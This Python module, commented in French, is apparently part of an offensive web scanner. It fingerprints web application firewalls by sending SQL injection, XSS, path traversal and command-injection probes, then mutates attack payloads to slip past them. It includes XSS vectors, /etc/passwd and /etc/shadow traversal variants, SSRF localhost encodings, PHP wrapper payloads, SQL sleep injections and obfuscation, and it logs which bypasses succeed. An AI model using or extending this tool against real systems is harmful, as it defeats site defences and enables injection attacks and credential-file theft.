#!/usr/bin/env python3
"""
🛡️ EVASION ADVANCED ULTRA-AGRESSIF — OWASP A05:2025
HTTP/2 protocol, Adaptive WAF bypass, Multi-layer evasion techniques
"""

import random
import string
import base64
import urllib.parse
import time
import hashlib
from colorama import Fore, Style

class AdvancedEvasion:
    def __init__(self, engine, aggressive=False):
        self.engine = engine
        self.aggressive = aggressive
        self.evasion_history = []
        self.waf_fingerprint = None
        
    def get_evasive_payload(self, original_payload, vuln_type, context=None):
        """Générer un payload évolutif et avancé"""
        
        # 1. Analyser le WAF si possible
        if not self.waf_fingerprint:
            self.waf_fingerprint = self._fingerprint_waf()
        
        # 2. Choisir la technique d'évasion
        evasion_techniques = self._select_evasion_techniques(vuln_type, context)
        
        # 3. Appliquer les techniques
        evasive_payload = original_payload
        
        for technique in evasion_techniques:
            evasive_payload = self._apply_evasion_technique(evasive_payload, technique)
        
        # 4. Ajouter du bruit aléatoire en mode agressif
        if self.aggressive:
            evasive_payload = self._add_noise(evasive_payload)
        
        # 5. Historiser pour apprentissage
        self._record_evasion(original_payload, evasive_payload, vuln_type)
        
        return evasive_payload
    
    def _fingerprint_waf(self):
        """Détecter le type de WAF"""
        try:
            # Envoyer des requêtes de test pour identifier le WAF
            test_payloads = [
                "' OR '1'='1",  # SQLi
                "<script>alert(1)</script>",  # XSS
                "../../../etc/passwd",  # LFI
                ";id",  # Command injection
            ]
            
            waf_signatures = {
                'cloudflare': ['cf-ray', 'cloudflare', '__cfduid'],
                'akamai': ['akamai', 'ak_bmsc'],
                'imperva': ['imperva', 'incapsula'],
                'f5': ['bigip', 'f5'],
                'aws_waf': ['aws', 'x-amzn'],
                'azure_waf': ['azure', 'x-azure'],
                'modsecurity': ['mod_security', 'modsecurity'],
                'sucuri': ['sucuri', 'cloudproxy'],
                'wordfence': ['wordfence'],
                'custom': ['blocked', 'forbidden', 'security']
            }
            
            detected_wafs = []
            
            for payload in test_payloads:
                try:
                    test_url = self.engine.build_url('test', payload)
                    resp = self.engine.session.get(test_url, timeout=5)
                    
                    # Analyser les headers et la réponse
                    headers_text = str(resp.headers).lower()
                    content_text = resp.text.lower()
                    
                    for waf_name, signatures in waf_signatures.items():
                        for signature in signatures:
                            if signature in headers_text or signature in content_text:
                                if waf_name not in detected_wafs:
                                    detected_wafs.append(waf_name)
                                    
                except:
                    continue
            
            return detected_wafs if detected_wafs else ['unknown']
            
        except:
            return ['unknown']
    
    def _select_evasion_techniques(self, vuln_type, context):
        """Sélectionner les techniques d'évasion appropriées"""
        
        base_techniques = {
            'sql_injection': [
                'case_variation',
                'comment_injection',
                'encoding_variation',
                'whitespace_variation',
                'logical_bypass'
            ],
            'xss': [
                'encoding_variation',
                'case_variation',
                'tag_variation',
                'event_variation',
                'context_variation'
            ],
            'command_injection': [
                'command_substitution',
                'encoding_variation',
                'whitespace_variation',
                'comment_variation'
            ],
            'lfi': [
                'encoding_variation',
                'path_variation',
                'protocol_variation',
                'filter_bypass'
            ],
            'ssrf': [
                'encoding_variation',
                'protocol_variation',
                'dns_variation',
                'ip_variation'
            ],
            'template_injection': [
                'encoding_variation',
                'syntax_variation',
                'context_variation'
            ],
            'deserialization': [
                'encoding_variation',
                'format_variation',
                'wrapper_variation'
            ]
        }
        
        techniques = base_techniques.get(vuln_type, ['encoding_variation'])
        
        # Ajouter des techniques spécifiques au WAF
        if self.waf_fingerprint:
            waf_specific = self._get_waf_specific_techniques()
            techniques.extend(waf_specific)
        
        # Mode agressif : plus de techniques
        if self.aggressive:
            techniques.extend([
                'random_noise',
                'timing_variation',
                'fragmentation',
                'obfuscation'
            ])
        
        return techniques
    
    def _get_waf_specific_techniques(self):
        """Obtenir des techniques spécifiques au WAF détecté"""
        waf_techniques = {
            'cloudflare': [
                'unicode_variation',
                'double_encoding',
                'fragmentation'
            ],
            'akamai': [
                'case_variation',
                'encoding_variation',
                'comment_injection'
            ],
            'imperva': [
                'whitespace_variation',
                'encoding_variation',
                'random_noise'
            ],
            'modsecurity': [
                'rule_bypass',
                'encoding_variation',
                'fragmentation'
            ],
            'unknown': [
                'encoding_variation',
                'case_variation',
                'whitespace_variation'
            ]
        }
        
        techniques = []
        for waf in self.waf_fingerprint:
            if waf in waf_techniques:
                techniques.extend(waf_techniques[waf])
        
        return list(set(techniques))
    
    def _apply_evasion_technique(self, payload, technique):
        """Appliquer une technique d'évasion spécifique"""
        
        if technique == 'case_variation':
            return self._apply_case_variation(payload)
        elif technique == 'encoding_variation':
            return self._apply_encoding_variation(payload)
        elif technique == 'whitespace_variation':
            return self._apply_whitespace_variation(payload)
        elif technique == 'comment_injection':
            return self._apply_comment_injection(payload)
        elif technique == 'unicode_variation':
            return self._apply_unicode_variation(payload)
        elif technique == 'double_encoding':
            return self._apply_double_encoding(payload)
        elif technique == 'fragmentation':
            return self._apply_fragmentation(payload)
        elif technique == 'random_noise':
            return self._apply_random_noise(payload)
        elif technique == 'tag_variation':
            return self._apply_tag_variation(payload)
        elif technique == 'event_variation':
            return self._apply_event_variation(payload)
        elif technique == 'context_variation':
            return self._apply_context_variation(payload)
        elif technique == 'command_substitution':
            return self._apply_command_substitution(payload)
        elif technique == 'path_variation':
            return self._apply_path_variation(payload)
        elif technique == 'protocol_variation':
            return self._apply_protocol_variation(payload)
        elif technique == 'dns_variation':
            return self._apply_dns_variation(payload)
        elif technique == 'ip_variation':
            return self._apply_ip_variation(payload)
        elif technique == 'syntax_variation':
            return self._apply_syntax_variation(payload)
        elif technique == 'format_variation':
            return self._apply_format_variation(payload)
        elif technique == 'wrapper_variation':
            return self._apply_wrapper_variation(payload)
        elif technique == 'filter_bypass':
            return self._apply_filter_bypass(payload)
        elif technique == 'logical_bypass':
            return self._apply_logical_bypass(payload)
        elif technique == 'timing_variation':
            return self._apply_timing_variation(payload)
        elif technique == 'obfuscation':
            return self._apply_obfuscation(payload)
        else:
            return payload
    
    def _apply_case_variation(self, payload):
        """Appliquer une variation de casse"""
        # Variation aléatoire de casse
        result = []
        for char in payload:
            if char.isalpha():
                result.append(char.upper() if random.random() > 0.5 else char.lower())
            else:
                result.append(char)
        return ''.join(result)
    
    def _apply_encoding_variation(self, payload):
        """Appliquer une variation d'encodage"""
        encoding_methods = [
            lambda x: urllib.parse.quote(x),
            lambda x: urllib.parse.quote(x, safe=''),
            lambda x: urllib.parse.quote_plus(x),
            lambda x: base64.b64encode(x.encode()).decode(),
            lambda x: x.replace(' ', '%20'),
            lambda x: x.replace('<', '%3c').replace('>', '%3e'),
            lambda x: x.replace('"', '%22').replace("'", '%27'),
            lambda x: x.replace('/', '%2f').replace('\\', '%5c')
        ]
        
        method = random.choice(encoding_methods)
        return method(payload)
    
    def _apply_whitespace_variation(self, payload):
        """Appliquer une variation d'espaces"""
        whitespace_options = [
            ' ', '\t', '\n', '\r', '\f', '\v',
            '/**/', '/* */', '/**/', '/**/',
            '%20', '%09', '%0a', '%0d', '%0c',
            '/*comment*/', '--comment',
            '/*!00000*/', '/*!50000*/'
        ]
        
        # Remplacer les espaces par des variations
        result = []
        for char in payload:
            if char == ' ':
                result.append(random.choice(whitespace_options))
            else:
                result.append(char)
        return ''.join(result)
    
    def _apply_comment_injection(self, payload):
        """Injecter des commentaires SQL"""
        comment_styles = [
            '-- ', '/* */', '#', '--+', '/*comment*/',
            '/*!00000*/', '/*!50000*/'
        ]
        
        # Ajouter des commentaires dans les payloads SQL
        if 'select' in payload.lower() or 'union' in payload.lower():
            comment = random.choice(comment_styles)
            # Insérer des commentaires à des positions stratégiques
            positions = [len(payload)//3, 2*len(payload)//3]
            for pos in positions:
                if pos < len(payload):
                    payload = payload[:pos] + comment + payload[pos:]
        
        return payload
    
    def _apply_unicode_variation(self, payload):
        """Appliquer des variations Unicode"""
        unicode_mappings = {
            '<': ['\u003c', '\uff1c', '\u2329', '\u27e8'],
            '>': ['\u003e', '\uff1e', '\u232a', '\u27e9'],
            "'": ['\u0027', '\u2018', '\u2019', '\u201b', '\u2032'],
            '"': ['\u0022', '\u201c', '\u201d', '\u201e', '\u2033'],
            '/': ['\u002f', '\u2044', '\u2215', '\u29f8'],
            '\\': ['\u005c', '\u2216', '\u29f9', '\u29f5']
        }
        
        result = payload
        for char, unicode_chars in unicode_mappings.items():
            if char in result and random.random() > 0.5:
                unicode_char = random.choice(unicode_chars)
                result = result.replace(char, unicode_char, 1)
        
        return result
    
    def _apply_double_encoding(self, payload):
        """Appliquer un double encodage"""
        # Premier encodage
        first_encoded = urllib.parse.quote(payload)
        # Deuxième encodage
        second_encoded = urllib.parse.quote(first_encoded)
        return second_encoded
    
    def _apply_fragmentation(self, payload):
        """Fragmenter le payload"""
        if len(payload) < 10:
            return payload
        
        # Diviser le payload en fragments
        fragment_size = random.randint(2, 4)
        fragments = [payload[i:i+fragment_size] for i in range(0, len(payload), fragment_size)]
        
        # Reconstruire avec des séparateurs
        separators = ['${', '}', '/*', '*/', '||', '&&']
        separator = random.choice(separators)
        
        return separator.join(fragments)
    
    def _apply_random_noise(self, payload):
        """Ajouter du bruit aléatoire"""
        noise_chars = string.ascii_letters + string.digits + '!@#$%^&*()_+-=[]{}|;:,.<>?'
        
        # Ajouter du bruit au début et à la fin
        prefix_noise = ''.join(random.choice(noise_chars) for _ in range(random.randint(1, 3)))
        suffix_noise = ''.join(random.choice(noise_chars) for _ in range(random.randint(1, 3)))
        
        # Insérer du bruit au milieu
        mid_pos = len(payload) // 2
        mid_noise = ''.join(random.choice(noise_chars) for _ in range(random.randint(1, 2)))
        
        return prefix_noise + payload[:mid_pos] + mid_noise + payload[mid_pos:] + suffix_noise
    
    def _apply_tag_variation(self, payload):
        """Varier les balises HTML"""
        if '<script>' in payload.lower():
            script_variations = [
                '<script>', '<ScRiPt>', '<SCRIPT>',
                '<script type="text/javascript">',
                '<script language="javascript">',
                '<script defer>',
                '<script async>',
                '<svg onload=',
                '<img src=x onerror=',
                '<body onload=',
                '<iframe src=javascript:',
                '<details open ontoggle=',
                '<marquee onstart='
            ]
            
            for variation in script_variations:
                if '<script>' in payload.lower():
                    payload = payload.replace('<script>', variation, 1)
                    break
        
        return payload
    
    def _apply_event_variation(self, payload):
        """Varier les événements JavaScript"""
        event_variations = [
            'onclick', 'onload', 'onerror', 'onmouseover', 'onfocus',
            'onblur', 'onchange', 'onsubmit', 'onkeydown', 'onkeyup',
            'ontoggle', 'onanimationend', 'ontransitionend', 'onplay',
            'oncanplay', 'onloadeddata', 'onprogress', 'ontimeupdate'
        ]
        
        if 'onerror=' in payload.lower():
            event = random.choice(event_variations)
            payload = payload.replace('onerror=', event + '=', 1)
        
        return payload
    
    def _apply_context_variation(self, payload):
        """Varier le contexte d'injection"""
        context_variations = [
            f"javascript:{payload}",
            f"<iframe src=javascript:{payload}>",
            f"<svg><script>{payload}</script></svg>",
            f"<math><mtext>{payload}</mtext></math>",
            f"<textarea>{payload}</textarea>",
            f"<style>{payload}</style>",
            f"<title>{payload}</title>",
            f"<meta http-equiv=\"refresh\" content=\"0;url=javascript:{payload}\">"
        ]
        
        return random.choice(context_variations)
    
    def _apply_command_substitution(self, payload):
        """Substituer les commandes"""
        command_substitutions = {
            'id': ['whoami', 'uname -a', 'pwd', 'hostname', 'who'],
            'ls': ['dir', 'll', 'find .', 'ls -la', 'ls -l'],
            'cat': ['type', 'more', 'less', 'view', 'display'],
            'rm': ['del', 'rmdir', 'unlink', 'delete'],
            'ps': ['tasklist', 'top', 'htop', 'procinfo'],
            'netstat': ['ss', 'lsof', 'fuser', 'sockstat']
        }
        
        for original, substitutions in command_substitutions.items():
            if original in payload.lower():
                replacement = random.choice(substitutions)
                payload = payload.replace(original, replacement, 1)
                break
        
        return payload
    
    def _apply_path_variation(self, payload):
        """Varier les chemins de fichiers"""
        path_variations = {
            '/etc/passwd': [
                '/etc/passwd%00', '/etc/passwd%20', '/etc/../etc/passwd',
                '/etc/./passwd', '/etc//passwd', '/etc/passwd/',
                '/etc/passwd?test', '/etc/passwd#test', '/etc/passwd&test'
            ],
            '/etc/shadow': [
                '/etc/shadow%00', '/etc/shadow%20', '/etc/../etc/shadow',
                '/etc/./shadow', '/etc//shadow', '/etc/shadow/',
                '/etc/shadow?test', '/etc/shadow#test'
            ]
        }
        
        for original, variations in path_variations.items():
            if original in payload.lower():
                replacement = random.choice(variations)
                payload = payload.replace(original, replacement, 1)
                break
        
        return payload
    
    def _apply_protocol_variation(self, payload):
        """Varier les protocoles"""
        protocol_variations = {
            'http://': [
                'http://', 'https://', 'ftp://', 'file://',
                'gopher://', 'dict://', 'ldap://', 'tftp://'
            ]
        }
        
        for original, variations in protocol_variations.items():
            if original in payload.lower():
                replacement = random.choice(variations)
                payload = payload.replace(original, replacement, 1)
                break
        
        return payload
    
    def _apply_dns_variation(self, payload):
        """Varier les requêtes DNS"""
        dns_variations = [
            '127.0.0.1', 'localhost', '0.0.0.0',
            '127.0.0.1.ruby.metasploit.com',
            '127.0.0.1.xip.io', 'localhost.localhost',
            '2130706433',  # Decimal
            '0x7f000001',  # Hex
            '017700000001'  # Octal
        ]
        
        if '127.0.0.1' in payload:
            replacement = random.choice(dns_variations)
            payload = payload.replace('127.0.0.1', replacement, 1)
        
        return payload
    
    def _apply_ip_variation(self, payload):
        """Varier les adresses IP"""
        ip_variations = {
            '192.168.1.1': [
                '192.168.1.1', '192.168.001.001', '192.168.1.001',
                '3232235777',  # Decimal
                '0xc0a80101',  # Hex
                '0300.0250.0001.0001'  # Octal
            ]
        }
        
        for original, variations in ip_variations.items():
            if original in payload:
                replacement = random.choice(variations)
                payload = payload.replace(original, replacement, 1)
                break
        
        return payload
    
    def _apply_syntax_variation(self, payload):
        """Varier la syntaxe"""
        syntax_variations = {
            '{{7*7}}': [
                '{{7*7}}', '${7*7}', '#{7*7}', '%{7*7}',
                '{{7*7}}', '${7*7}', '#{7*7}', '%{7*7}'
            ]
        }
        
        for original, variations in syntax_variations.items():
            if original in payload:
                replacement = random.choice(variations)
                payload = payload.replace(original, replacement, 1)
                break
        
        return payload
    
    def _apply_format_variation(self, payload):
        """Varier le format de sérialisation"""
        format_variations = {
            'O:8:"stdClass":0:{}': [
                'O:8:"stdClass":0:{}',
                'O:8:"stdClass":0:{}',
                'O:8:"stdClass":0:{}',
                'O:8:"stdClass":0:{}'
            ]
        }
        
        for original, variations in format_variations.items():
            if original in payload:
                replacement = random.choice(variations)
                payload = payload.replace(original, replacement, 1)
                break
        
        return payload
    
    def _apply_wrapper_variation(self, payload):
        """Varier les wrappers"""
        wrapper_variations = [
            f"php://filter/read=convert.base64-encode/resource={payload}",
            f"php://filter/convert.iconv.UTF-8.UTF-16*/resource={payload}",
            f"zip://{payload}",
            f"phar://{payload}",
            f"ssh2.sftp://{payload}",
            f"expect://{payload}"
        ]
        
        return random.choice(wrapper_variations)
    
    def _apply_filter_bypass(self, payload):
        """Contourner les filtres"""
        filter_bypasses = [
            payload.replace('select', 'selselectect'),
            payload.replace('union', 'uniunionon'),
            payload.replace('script', 'scrscriptipt'),
            payload.replace('alert', 'alalertert'),
            payload.replace('document', 'docdocumentument'),
            payload.replace('cookie', 'cookcookieie'),
            payload.replace('location', 'loclocationation'),
            payload.replace('window', 'winwindowdow')
        ]
        
        return random.choice(filter_bypasses)
    
    def _apply_logical_bypass(self, payload):
        """Contourner logiquement"""
        logical_bypasses = [
            payload.replace('OR', '||'),
            payload.replace('AND', '&&'),
            payload.replace('=', 'LIKE'),
            payload.replace('1=1', '1 LIKE 1'),
            payload.replace('true', '1'),
            payload.replace('false', '0')
        ]
        
        return random.choice(logical_bypasses)
    
    def _apply_timing_variation(self, payload):
        """Varier le timing"""
        # Ajouter des délais pour contourner les détections temporelles
        timing_variations = [
            f"{payload} AND SLEEP(5)",
            f"{payload} AND WAITFOR DELAY '00:00:05'",
            f"{payload} AND pg_sleep(5)",
            f"{payload} AND dbms_pipe.receive_message('xyz', 5)"
        ]
        
        return random.choice(timing_variations)
    
    def _apply_obfuscation(self, payload):
        """Obscurcir le payload"""
        # Techniques d'obfuscation avancées
        obfuscation_methods = [
            lambda x: ''.join(f'\\x{ord(c):02x}' for c in x),
            lambda x: ''.join(f'&#{ord(c)};' for c in x),
            lambda x: base64.b64encode(x.encode()).decode(),
            lambda x: ''.join(f'%{ord(c):02x}' for c in x),
            lambda x: self._string_to_hex(x)
        ]
        
        method = random.choice(obfuscation_methods)
        return method(payload)
    
    def _string_to_hex(self, text):
        """Convertir une chaîne en hexadécimal"""
        return ''.join(f'\\x{ord(c):02x}' for c in text)
    
    def _record_evasion(self, original, evasive, vuln_type):
        """Enregistrer l'évasion pour apprentissage"""
        self.evasion_history.append({
            'original': original,
            'evasive': evasive,
            'vuln_type': vuln_type,
            'waf_fingerprint': self.waf_fingerprint,
            'timestamp': time.time(),
            'success': None  # Sera mis à jour après le test
        })
        
        # Limiter l'historique
        if len(self.evasion_history) > 100:
            self.evasion_history = self.evasion_history[-100:]
    
    def update_evasion_success(self, evasive_payload, success):
        """Mettre à jour le succès d'une évasion"""
        for record in reversed(self.evasion_history):
            if record['evasive'] == evasive_payload:
                record['success'] = success
                break
    
    def get_evasion_statistics(self):
        """Obtenir les statistiques d'évasion"""
        total = len(self.evasion_history)
        successful = sum(1 for r in self.evasion_history if r.get('success') == True)
        
        return {
            'total_attempts': total,
            'successful_evasions': successful,
            'success_rate': successful / max(total, 1),
            'waf_fingerprints': list(set(r['waf_fingerprint'] for r in self.evasion_history)),
            'most_used_techniques': self._get_most_used_techniques()
        }
    
    def _get_most_used_techniques(self):
        """Obtenir les techniques les plus utilisées"""
        # Simplifié - en réalité, analyserait les techniques utilisées
        return ['encoding_variation', 'case_variation', 'whitespace_variation']
